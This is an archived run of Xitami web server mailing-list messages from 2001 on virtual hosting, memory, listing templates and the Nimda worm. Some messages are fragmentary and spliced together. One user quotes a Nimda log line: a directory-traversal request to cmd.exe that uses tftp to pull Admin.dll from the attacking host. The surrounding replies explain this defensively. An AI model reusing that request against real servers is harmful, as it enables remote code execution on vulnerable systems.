From xitami@lists.xitami.org  Tue Sep 25 19:07:57 2001
From: xitami@lists.xitami.org (Russel Olinger)
Date: Tue, 25 Sep 2001 11:07:57 -0700
Subject: [Xitami] HELP - virtual DNS hosting
References: <NDBBIDKBILPOMBMKDOOCCEIHCDAA.alsiman@cofs.net> <000201c14573$11924a00$123d60cb@cable.net.nz>
Message-ID: <0ac301c145ed$01402030$020aa8c0@Master>

I just went through this and finally got mine to work..  Here is what I did
and think might work for you.

When using the VHost wizard you need to define the following fields as such:

Create virtual host profile:      hostx.cfg (.cfg is assumed)
Select IP address:                  All Addresses (recommended)
Or, enter DNS host name:    www.yourdomain.com
Web Page Root Directory:    /Xitami/hostx/webpages
CGI-bin directory:                /Ximati/hostx/cgi-bin
FTP root directory:              /Ximati/hostx/ftproot
Create directories if necessary?  Checked

Whats important in the above example is that you make soft references to the
directory path using forward "/" slashes.  I tried using windows default
back "\" slashes and had problems.  I also made a hard reference using
"c:\PATH" and had problems too.  It seems Xitami even treats its configs and
Path references like URLs using the forward "/" slash.  I choose to do the
above configs because that allowed me to contain all files and
sub-directories within a single root directory.  Others have choosen to
create the /Xitami/hostx/webpages for their html docs but then did
/Xitami/cgi-bin to contain ALL CGI files for all domains in a single
directory.  For myself I like a little bit more organization.  However, some
of my domains do share the same CGI files (most of my databasing needs all
rely on the same database utilizing seperate tables from the same DB, the
reason I did this is because I designed a Perl DB that allows me to create
tables, queries, entry forms, etc on the fly)  In order to share the same DB
across multiple domains (but make it look like each domain has a separate
DB) I created a VHost domain simply to host the DB and nothing else.  Then
when DomainX needs certain DB functions I will pass URL (most likely from a
FRAME subset) from DomainX to DomainDB.  This process can be repeated across
multiple domains allowing me to manage only one DB.  Security is not the
greatest but is managed through a series of checks and balances using Cookie
s.

Anyway, I got off on a tanget.  Xitami only creates the directories.  It
doesn't place any "index.htm" or "default.htm" files in the directories just
created for "hostx".  You shouldn't have to make any references any where
else, as long as your FORWARD (A records) DNS is working correctly for that
VHost then all should work OK.  The only PTR DNS (reverse) record for the
Xitami server should be for the main domain on that server.  In my case, if
someone accesses my server via the IP address then a default page (managed
by the cgi files of DomainDB) is displayed simply showing links to all the
domains hosted on that server.

I intend on using my server as a training device, once I get everything
completed people will be able to access my site and look at config files,
domain references and mainly the DB I created.

Hope some of this helps.

exploder stage, reads the (MIME) headers, and bounces unwelcome traffic
back to sender.

Nimda and other similar viruses, and happen to have the name of the
mailing list in their address books.

From xitami@lists.xitami.org  Tue Sep 25 20:02:11 2001
From: xitami@lists.xitami.org (Paul Reid)
Date: Tue, 25 Sep 2001 15:02:11 -0400
Subject: [Xitami] win2k directory security
References: <NDBBIDKBILPOMBMKDOOCIEIHCDAA.alsiman@cofs.net> <3BAFF7A1.DA47754D@rci.rutgers.edu> <00f901c14573$0e34a010$0a00a8c0@enigmacomputers.com>
Message-ID: <3BB0D4B3.592150A7@rci.rutgers.edu>

> NT is built off of OS/2?

Distantly. 

IBM and MS worked together on a clean (not DOS) operating system. Later
they had a falling-out. IBM released OS/2, and soon after MS released
NT. They have quite different user interfaces, but much in common
underneath. And NT has or had some support for OS/2 programs with a
limited subset of Presentation Manager functions. 

As for security and multitasking: if CPM/DOS are at one end, with Win9x
just above, and a good unix is at the other end: both OS/2 and NT
cluster far above DOS/Win9x but below unix in both potential security
and in simplicity. They may not be twins under the skin, and sure are
not kissing cousins, but are somehow closely related. 

 -PRR

More RAM may stop thrashing. 

You may just be getting hit by a lot of Nimba requests. Xitami has to

the hard drive. 

BTW: thrashing the drive probably won't hurt it. I know an ex hard drive
designer and he tells tales of the "torture rack" they used to test new
designs. The worst Windows thrashing is nothing like a worst-cast
thrash-test.

> w98 reports about 84Megs allocated, 

WHAT ???

To some degree, that's bogus. Win9x will "allocate" all the RAM and swap
it can find, even if it does not have anything useful to put in that
space. 

But I've seen win95 run fairly quietly in 16Megs, and not gasp too loud
in 8Megs. I know Win98se is bigger, and 28M is way below what most
people like, but 84 megs? And less thrashing if Xitami is stopped? 

>  what's the xitami footprint on the memory?

500 Kb to 4 Megs, more or less, depending. I have run Xitami on a _4_Meg
machine without crowding (but that was Windows 3!). 

BUT note that the "Graphical Interface" version of Win32 Xitami has a
known memory leak or something. I've only used the Command Line or
Service versions so I don't know the details. 

WinNT has a better Monitor than Win9x. It shows, on my main machine, up
for 8 days and fairly busy:

Mem usage - 3,345 K (varies a little)
VM size - 1,812 K

The machine has 128 Megs RAM (RAM was cheap that day) but NT only shows
35 Megs in use now, 36 Megs peak commit charge. 8 Megs goes to RealAudio
server; about 4 megs to my remote control app. When I ran in 32 megs
without those two apps, it often sat at 24 to 28 megs in use.

Total memory shows as "351M" which suggests I have Swap set to 220 Megs.
(Frankly, if this machine EVER swaps it probably means something has
gone very wrong... but when cleaning out cluttered log folders sometimes
the filesystem needs a lot of workspace.)

 -PRR

From xitami@lists.xitami.org  Tue Sep 25 22:24:16 2001
From: xitami@lists.xitami.org (Paul Reid)
Date: Tue, 25 Sep 2001 17:24:16 -0400
Subject: [Xitami] Hello World
References: <5.1.0.14.0.20010925163955.00af68f8@bienfeo.com>
Message-ID: <3BB0F600.6C76F6D3@rci.rutgers.edu>

> I don't have a "/scripts/" directory and still I got a 200 response.

Ewen explained that that URL is illegal; designed to trick IIS. You are
not supposed to have two percent-signs in a row. Whatever it does to IIS
does not happen to Xitami.

But it returns "200 OK" because Xitami "knows" the URL is illegal, and
trims-off the "bad part". Somehow it ends up thinking they want "/", and
it sends your home page. 

> I've turned off my sever for now. 

Nobody here has reported ANY Nimda trouble on Xitami, except the large
log files. 

 -PRR

From: xitami@lists.xitami.org (Ewen McNeill)
Date: Wed, 26 Sep 2001 09:18:31 +1200
Subject: [Xitami] Hello World

In message <5.1.0.14.0.20010925163955.00af68f8@bienfeo.com>, =?iso-8859-1?Q?=A1?
= Bienfeo ! writes:
>I'm sorry if this isn't how this list works. Do I just ask away? Here goes...

Yup, that's how it works.  Although it's often worth reading a bit to
see the sorts of questions being asked, and perhaps checking the mailing
list archives before asking.

>I'm troubled by lines like this:
>
>66.27.221.19 - - [25/Sep/2001:15:01:59 -0500] "GET 
>/scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2066.27.221.19%20GET%2
>0Admin.dll%20e:\Admin.dll 
>HTTP/1.0" 200 2006 "" ""

You probably want to read:

http://lists.xitami.org./pipermail/xitami/2001-September/000967.html

In short: due to the way that Xitami is resolving the URL with the
illegal '%' encoding, it manages to think it should serve up the home
page for the site, so it sends that as a 200 response.  Other than a
little extra traffic, nothing bad happens.

Ewen

From xitami@lists.xitami.org  Tue Sep 25 22:31:16 2001
From: xitami@lists.xitami.org (John Jonas)
Date: Tue, 25 Sep 2001 16:31:16 -0500
Subject: [Xitami] Hello World
References: <5.1.0.14.0.20010925163955.00af68f8@bienfeo.com>
Message-ID: <3BB0F7A4.D67684C6@arbor-freight.com>

"! Bienfeo !" wrote:

>
> Although I more or less understand stand what's happening I have a few
> questions. Like about the fact that I don't have a "/scripts/" directory
> and still I got a 200 response. (a few months ago I watched code red return
> 404 over and over and over again) I can't even find a directory on the
> entire local disk where I keep Xitami named "scripts"  Anyway I've turned
> off my sever for now. I'm running Win2000pro. I have never installed IIS or
> FrontPage, but I use IE 5.

The reason Xitami servers are not being infected is that Xitami does not have the "/scripts/" and other
items that Nimda is trying to exploit.  It is looking to use items made available by IIS and Xitami just
doesn't have them (thank God).  Error messages will automatically be generated for these requests and
recorded in the errors.log file, but other than log file size and slightly redeuced bandwidth (incoming
requests and outgoing error messages) nothing real serious is happening to Xitami sites.

No one has reported here a reason to turn off an Xitami server because of this worm.

In-Reply-To: <0ac301c145ed$01402030$020aa8c0@Master>
Message-ID: <NDBBIDKBILPOMBMKDOOCAEJACDAA.alsiman@cofs.net>

THANKS TO EVERYONE THAT HAS RESPONDED.  I FINALLY DID GET IT TO WORK.  THE
BELLOW INFO IS HELPFULL, SINCE IT ACTUALLY TELLS YOU WHAT NEEDS TO BE
WRITTEN IN ALL THE REQUIRED FIELDS.

WHAT HAD ME IS THAT I AM NOT USED TO PUTTING THE "WWW." IN FRONT OF A DOMAIN
WHENEVER AN APPLICATION HAS A FIELD FOR YOU TO ENTER A DOMAIN.  I HAVE
ALWAYS ENTERED THEM AS "YOURDOMAIN.COM" WITHOUT THE "WWW."


Create virtual host profile:      hostx.cfg (.cfg is assumed)
Select IP address:                  All Addresses (recommended)
Or, enter DNS host name:    www.yourdomain.com
Web Page Root Directory:    /Xitami/hostx/webpages
CGI-bin directory:                /Ximati/hostx/cgi-bin
FTP root directory:              /Ximati/hostx/ftproot
Create directories if necessary?  Checked

Whats important in the above example is that you make soft references to the
directory path using forward "/" slashes.  I tried using windows default
back "\" slashes and had problems.  I also made a hard reference using
"c:\PATH" and had problems too.  It seems Xitami even treats its configs and
Path references like URLs using the forward "/" slash.

I HAVE GOTTEN XITAMI TO WORK WITH THE "\" DIRECTORY.  MY DIRECTORY LOOKS AS
FOLLOWS AND SEEMS TO BE WORKING FINE:

C:\XITAMI\WEBPAGES\MYVHOST\

SO FAR, SO GOOD.

GO LOOK:
www.mayanarch.com
www.thinkincircles.com
www.simangroup.com

From xitami@lists.xitami.org  Wed Sep 26 03:43:56 2001
From: xitami@lists.xitami.org (Russel Olinger)
Date: Tue, 25 Sep 2001 19:43:56 -0700
Subject: [Xitami] HELP - virtual DNS hosting
References: <NDBBIDKBILPOMBMKDOOCGEJCCDAA.alsiman@cofs.net> <020801c1462a$cefb9710$0a00a8c0@enigmacomputers.com>
Message-ID: <0c3801c14635$166e4160$020aa8c0@Master>

What Mr. Soulkoff is referring to:

In the defaults.cfg file, under the virtual hosts section:

<snippit>
[Virtual-hosts]
     www.mayanarch.com=mayanarch.cfg
     mayanarch.com=mayanarch.cfg
     www.thinkincircles.com=thinkincircles.cfg
     thinkincircles.com=thinkincircles.cfg
     www.simangroup.com=simangroup.cfg
     simangroup.com=simangroup.cfg
...
...
<snippit>

THEN, in your DNS server you must configure, A Records only:
     mayanarch.com    A    xxx.xxx.xxx.xxx
     www.mayanarch.com    A    xxx.xxx.xxx.xxx
    thinkincircles.com    A    xxx.xxx.xxx.xxx
    www.thinkincircles.com    A    xxx.xxx.xxx.xxx
    ...
    ...

This, of course, is assuming that xxx.xxx.xxx.xxx is the SAME IP address for
each of your VHosts.  Once the DNS reference is made for www.domain.com AND
domain.com then anyone who types either name into their browser will find
your server.  Once the request gets to your server, then the Xitami config
above will allow users, typing either name, to get to the correct site.

If you only have www.domain.com configured, and someone types
http://domain.com then that user won't ever get to your VHost because
www.domain.com and http://domain.com are physically TWO different DNS names
and they must each of their own DNS entry.  The same goes for Xitami.

From xitami@lists.xitami.org  Wed Sep 26 04:31:21 2001
From: xitami@lists.xitami.org (Kimman Balakrishnan)
Date: Wed, 26 Sep 2001 09:01:21 +0530
Subject: [Xitami] Happy Time Virus
References: <4eebb54ee8e0.4ee8e04eebb5@orange.net>
Message-ID: <3BB14C09.49661DCF@imagingindia.com>

One of the mails on the mailing list recd today contains the Happy Time
virus ... seems like someone's machine has been infected and the virus has
sent out a mail to the xitmai mailing list as well.

The Symantec web site's removal tool, fixhaptime.exe, could not remove it
from my Netscape mail file - perhaps because it is embedded within the mail
file. The only solution on Netscape was to open the file in MS Word and to
delete the "script" ... search for "Rem I am sorry! happy time" - this is
the first line in the VB script element of the HTML formatted message.
Delete the lines between the <script language='VBScript'> and the </script>
tags and save the file again.

For details on the virus search on google for "VBS.Haptime.A" - this will
provide a URL to the Symantec web site that has details.

Kimman Balakrishnan

From xitami@lists.xitami.org  Thu Sep 27 07:24:58 2001

When your server send a response, it can be a 200 OK or an error message, 
but it could also be a redirection.
The redirection command is decoded by the browser client. It must be a 
complete path (but some browser could use a relative path, relative to the 
page that calls the redirection).

Marc

I have a french version, but let's try :
 With the inbox selected, go to the menu option "VIEW", then "LAYOUT" =
and uncheck the "PREVIEW PANE".=20
This way, to read an e-mail you'll have to double click on it. THIS IS =
FOR OUTLOOK EXPRESS.
But MS Outlook should be like this also.

As for protection try norton anti-virus 2001, it checks your outlook =
accounts when you get the mail, and erases the infected file before it =
can attack.
and allways go to the symantec.com site to get the latest virus =
defenitions., that part is free.
Hope this can help.

Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

 Joubin.

Paulo is right. If you uncheck the preview pane you must doubleclick the =
message header before it opens. If the preview pane is on, the message =
will pop up immediatelly in it. This is not a good thing if you want to =
delete a message. You have to click it first. If you have selected to =
show preview pane the message will appear there as soon as you click it =
once. With preview pane off you can delete message without opening it. =
This way it is possible to get rid of messages that look suspicious.

Tomi
  ----- Original Message -----=20
  From: Joubin Far=20
  To: xitami@lists.xitami.org=20
  Sent: Thursday, September 27, 2001 4:41 PM
  Subject: Re: [Xitami] not opening email


  Hi Paulo,
  I don=B4t have french version but german/english version.
  I am sure that layout dosen=B4t have anything with not opening email =
but layout detemines layout for usersurface(menu) of outlook.
  Thank you for you tip.
  Best regards,
  Joubin

Give www.dns2go.com a look. They are set up for dynamic DNS, but I have a
static IP. I just insattled teh client once and configured it to point
my server when I am offline (which is never). It works quite well. You can
get an address like www.mydomain.dns2go.com for the exciting price of
$0.00.

I use BulkRegister.com.  If you are going to register a lot of domains, then
this is the way to go.  Their interface is easy and without all the NetSol
confusion.  their tech support is better also.

You pay an entry fee, which sucks, but if you register more than 10 domains
it pays itself back quick.

I pay as low as $8 to $10 dollars depending on my volume or their specials.

From xitami@lists.xitami.org  Fri Sep 28 03:25:33 2001
From: xitami@lists.xitami.org (Wally Nickel)
Date: Thu, 27 Sep 2001 22:25:33 -0400
Subject: [Xitami] Alias Directories & File Names
In-Reply-To: <200109101051.WAA28747@pagoda.in.naos.co.nz>
Message-ID: <DBEEJJPJIAKOPIIDNJFECEKJCDAA.wnickel1@home.com>

Ewen,

Well,  after a bit of deliberation,  and after some quick trials and tests,
it certainly does appear that .....

Simply changing the  applicable references  in the   'httpdir.gsl'   file
from   "nameurl"   to  "name"   does the trick on my system.
The directory lists, and all of  the file downloads now function as
typically expected.  A file named as "qwerty.exe" downloads or runs under
that same name,  and any other file(name) performs or downloads as that same
file(name).  No more double extensions or redundant/different extensions.

Thanks for that terrific tip and pointer.

Regards,
	Wally..

-----Original Message-----
From: xitami-admin@lists.xitami.org
[mailto:xitami-admin@lists.xitami.org]On Behalf Of Ewen McNeill
Sent: Monday, September 26, 2001 6:51 AM
To: xitami@lists.xitami.org
Subject: Re: [Xitami] Alias Directories & File Names


In message <CMEGIPIFEBJBCIKDJKNDAENECDAA.wnickel1@home.com>, "Wally Nickel"
writes:
>The only (minor) problem, actually a bit of a nuisance relates to the use
of
>ALIAS directory where DIRECTORY lists are enabled so that the downloadable
>files are listed.  The ALIAS lists and ALIAS directories portion works
well,
>but whenever a file gets downloaded,  the extension is either duplicated
>(i.e. "song.mp3" becomes "song.mp3.mp3") or an additional character is
added
>to the extension (i.e. "file.exe" becomes "file.exe(1)" ).

The extra extension tends to happen if you already have the file
downloaded to that directory; at least one common webbrowser handles this
situation by appending "(1)" to the filename.

The double extension issue is more puzzling; IIRC this used to happen
with Xitami 2.5b5 (it may still happen there), due to an extremely
conservative test for which characters don't need to be escaped in the
filename, resulting in the filename being escaped, and another extension
added by the webbrowser.  (If you think this is hitting you, in 2.5b5, try
substituting "name" for "nameurl" in httpdir.gsl and restarting.)

Off hand I can't think of anything in Xitami 2.4d9 which would cause
this effect, except possibly if the same code that causes the 2.5b5
effect is also in 2.4d9.

Does anyone else see this extension doubling in 2.4d9?

Ewen

Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

From xitami@lists.xitami.org  Fri Sep 28 17:03:17 2001
From: xitami@lists.xitami.org (Paul Reid)
Date: Fri, 28 Sep 2001 12:03:17 -0400
Subject: [Xitami] #$%!#$ NT
References: <0eeb01c147c3$8f22c560$020aa8c0@Master> <0eff01c147d7$901d3ae0$020aa8c0@Master>
Message-ID: <3BB49F45.2282E740@rci.rutgers.edu>

I would bet you have an invalid character in the directory name. 

Also note that "webserver" is not an 8.3 filename; the ones that work
for you are 8.3 style. Which command prompt are you using (Command or
CMS) and what editor are you using? 

Directory corruption isn't handled by DeFrag, except as a side effect.
Open the Properties of that drive, select Tools, click "Error Checking". 

Or (believe it or not) at the command line, run "CHKDSK D:". Just like
DOS. And like DOS, it won't fix unless you add " -F". One difference: on
NTFS, you can't do a ChkDsk with fix-up while the volume is mounted, but
it will offer to run it at the next boot.

Which offers another thought-- NT's filesystem is usually good but
sometimes loses track. Re-boot is rarely needed but often worth a try
when things seem wrong. NT does most sanity-checking at boot. 

 -PRR

From xitami@lists.xitami.org  Fri Sep 28 22:31:49 2001

----- Original Message -----
From: "Paul Reid" <preid@rci.rutgers.edu>
To: <xitami@lists.xitami.org>
Sent: Friday, September 28, 2001 9:03 AM
Subject: Re: [Xitami] #$%!#$ NT


> I would bet you have an invalid character in the directory name.
>
> Also note that "webserver" is not an 8.3 filename; the ones that work
> for you are 8.3 style. Which command prompt are you using (Command or
> CMS) and what editor are you using?
>
> Directory corruption isn't handled by DeFrag, except as a side effect.
> Open the Properties of that drive, select Tools, click "Error Checking".
>
> Or (believe it or not) at the command line, run "CHKDSK D:". Just like
> DOS. And like DOS, it won't fix unless you add " -F". One difference: on
> NTFS, you can't do a ChkDsk with fix-up while the volume is mounted, but
> it will offer to run it at the next boot.
>
> Which offers another thought-- NT's filesystem is usually good but
> sometimes loses track. Re-boot is rarely needed but often worth a try
> when things seem wrong. NT does most sanity-checking at boot.
>
>  -PRR
>
> --
> Xitami Users Mailing List -- For Xitami support
> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
>
>


From xitami@lists.xitami.org  Sat Sep 29 00:07:38 2001
From: xitami@lists.xitami.org (Paul Reid)
Date: Fri, 28 Sep 2001 19:07:38 -0400
Subject: [Xitami] #$%!#$ NT
References: <0eeb01c147c3$8f22c560$020aa8c0@Master> <0eff01c147d7$901d3ae0$020aa8c0@Master> <3BB49F45.2282E740@rci.rutgers.edu> <0fd001c14864$fb6e16b0$020aa8c0@Master>
Message-ID: <3BB502BA.BCA5E1F8@rci.rutgers.edu>

> 8 characters long and I could CD all day long

If that is how you want to spend all day . . . <G>

But seriously. It IS possible to navigate the NT command line with
long-names. 

Names with spaces need quotes, of course. 

And NT offers at least two command interpreters. "COMMAND" tries to be
similar to DOS; "CMD" has some new tricks. 

Either one should handle long-names.... but I know if I shell out from a
16-bit program I get a short-name 8.3 view of the filesystem. Invoking
Start, Run, "COMMAND", OK gives a longname world. Certain types of
shortcuts seem to force a SFN 8.3 world. 

That's why I was asking what editor you used and how you were getting to
a command line. Think about how you get there. Run "DIR" a lot because
it will show if you've dropped into 8.3-land. 

 -PRR

From xitami@lists.xitami.org  Sat Sep 29 16:21:55 2001
From: xitami@lists.xitami.org (Francis Turner)
Date: Sat, 29 Sep 2001 17:21:55 +0200
Subject: [Xitami] Some problems with XML file and directory listings
References: <5.1.0.14.2.20010928142254.009e9920@pop.idx.com.au> <3BB48376.27ABF23A@trmail.triumf.ca>
Message-ID: <3BB5E713.3090708@freesbee.fr>

Rod B. Nussbaumer wrote:

> David Broker wrote:
> 
>> Hi,
>> I was wondering if someone could help me with a few problems I was having?
>> I'm using Xitami 2.5b4 on Windows 98 for testing of my websites.
> 
>> And my other problem; when clicking on a link in a directory listing the
>> URL in the address bar will come up like so:
>> http://127.0.0.1/test%2Ephp
> 
> 
> Same problem here, with 2.5b4 on Win95.  I reported this a few months
> ago, and the only recommendation I got was to make sure Xitami was
> out in it's own directory; ie not under 'Program Files'.  I tried that
> and it didn't help.  I'm still hoping someone can come up with a solution.
> 
> 	---   rod.
> 
This is fixed by the same name/nameurl fix that ewen mentioned fixing 
the double extension issue.

You need to modify the httpdir.gsl (or better copy it, modify the copy 
and use the copy instead of the original) in the templates directory.

Line 89 is in the original form:

<A HREF="$(urlbase:)$(nameurl:)"><IMG SRC="$(icon)" 
BORDER=0>$(name:)</A></TD>

You should change this to :

<A HREF="$(urlbase:)$(name:)"><IMG SRC="$(icon)" BORDER=0>$(name:)</A></TD>

Personally I think this is the correct behaviour. Nameurl seems to be a 
bit too escaped to be useful for anything

Francis


From xitami@lists.xitami.org  Sat Sep 29 16:26:47 2001

Hello Xitami World,

As a very happy, long time user of Xitami, I accidentally upgraded/installed beta 2.5b1 on our win2000 box (latest SP and patches).  It
worked well for several weeks then as we began to *use* it, Xitami
would hang, no http or admin access.  The local console would not
respond and "stopping" the process failed.  The only way to end it was
to go to the command prompt and "Kill" it.  It may hang three times a
day or once in three days.

The details -

* Clean install on a new box with Win2000 with full SP and patches
* Two other process running small mail server (a dozen accounts) and
FTP.
* 512 meg, 30 gig hd
* Event logger says.." Xitami unexpectedly terminated"  and "restart
failed because an instance of Xitami is all ready running"
* The log file shows nimda at work but the hanging does not seem to be
related to the nimda hit times
* Loads of "...glsgen E: can't open schema file..."  errors
* No relevent errors in other log files (access or errors)
* The system is now in *use* so I hesitate in doing anything that
might cause the system to be down for painfully-long time :0

The questions -
1. Does these issues sound like a beta problem?
2. Can I load a production version *over* the beta without introducing
disaster?
3. Any other suggestions are appreciated!
  

Best regards,
 Irv                          mailto:xitami@iglobal.com
